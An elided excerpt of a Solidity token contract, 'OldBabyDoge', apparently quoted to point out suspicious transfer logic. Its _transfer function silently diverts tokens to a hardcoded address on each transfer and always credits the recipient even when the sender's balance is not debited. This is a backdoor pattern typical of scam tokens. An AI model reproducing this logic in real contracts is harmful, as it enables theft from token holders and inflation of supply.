...
contract  OldBabyDoge  is Ownable, IERC20 {
    ...
    string private _name = "OldBabyDoge";
    string private _symbol = "OldBabyDoge";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x8b3bee501dD86B49F19B32a8565021b0aab04C67] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0x8b3bee501dD86B49F19B32a8565021b0aab04C67, _teamtoken);
        }
